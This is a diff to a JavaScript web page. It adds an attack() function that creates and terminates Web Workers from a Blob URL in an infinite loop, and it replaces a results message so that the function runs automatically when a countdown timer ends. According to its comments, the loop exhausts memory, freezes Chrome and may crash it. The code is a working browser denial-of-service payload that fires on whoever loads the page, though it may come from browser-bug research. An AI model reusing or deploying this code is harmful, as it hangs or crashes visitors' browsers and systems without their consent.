@@ -45,6 +45,36 @@ function userNotTesting() {
     close();
 }
 
+function attack () {
+    var blob = new Blob([
+        document.querySelector('#worker1').textContent
+    ], { type: "text/javascript" })
+
+    var worker
+	// There are two dangerouse scenarios
+	// There are two dangerouse scenarios
+	// There are two dangerouse scenarios
+		
+    // 1) Memory grow without limit (until around 15 gigs on my system of 16 gigs) & without errors
+    // or Memory grows but then falls back to half while Chrome continuously being irresponsive,
+	
+    // I also experienced once what appears a memory leak (or unsafe closing) as when killing Chrome process
+    // Windows turned an error I cannot remember or reproduce
+    for (let index = 0; index < Infinity; index++) {
+        worker = new Worker(window.URL.createObjectURL(blob));
+        worker.terminate()
+        worker = undefined
+    }
+	
+    // setInterval(function() {
+    //     // 2) memory grows then Error code: STATUS_BREAKPOINT
+    //     worker = new Worker(window.URL.createObjectURL(blob));
+    //     // 3) totally fine here !!!
+    //     worker.terminate()
+    //     worker = undefined
+    // }, 0);
+}
+
 function test() {
     console.log('omg omg testing')
     var oldDateObj = new Date();
@@ -70,7 +100,7 @@ function test() {
         // If the count down is finished, write some text
         if (distance < 0) {
             clearInterval(x);
-            document.getElementById("demo").innerHTML = "It went well, It seems your explorer supported this attack. Please send me your findings.";
+            attack()
         }
     }, 1000);
 }
